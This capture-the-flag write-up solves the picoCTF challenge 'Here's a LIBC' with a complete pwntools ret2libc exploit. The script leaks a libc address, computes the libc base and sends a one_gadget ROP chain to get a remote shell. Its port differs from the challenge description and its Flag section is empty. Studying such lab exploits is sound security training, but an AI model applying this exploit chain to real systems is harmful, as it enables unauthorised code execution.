# Here's a LIBC

Type/Tags : Binary Exploitation
Author : Madstacks

# Description
I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 23584

# Hints
PWNTools has a lot of useful features for getting offsets.

# Solution
Very standard ret2libc challenge with vuln being the vulnerable ELF executable and libc.so.6 being the version of libc used that is needed to exploit the challenge. You can learn about ret2libc challenges in a lot of places including LiveOverflow's videos on the topic, pwn.college, and here: https://research.801labs.org/stack-exploitation/

Final exploit script:

from pwn import *
p = remote('mercury.picoctf.net', 1774)
elf = ELF("./vuln")
libc = ELF("./libc.so.6")
rop = ROP(elf)

PUTS = elf.plt['puts']
MAIN = elf.symbols['main']
LIBC_START_MAIN = elf.symbols['__libc_start_main']

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

#create the first rop chain to leak libc address
JUNK = ("A"*136).encode()
rop = JUNK
rop += p64(POP_RDI)
rop += p64(LIBC_START_MAIN)
rop += p64(PUTS)
rop += p64(MAIN)

p.sendlineafter("sErVeR!", rop)

p.recvline()
p.recvline()

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))


libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

#second rop chain to jump to /bin/sh
rop2 = JUNK
rop2 += p64(RET)
rop2 += p64(POP_RDI)
rop2 += p64(libc.address + 0x10a45c)

#found by using one_gadget /bin/sh
#0x4f365
#0x4f3c2
#0x10a45c

rop2 += p64(leak)

p.sendlineafter("sErVeR!", rop2)

p.interactive()

# Flag
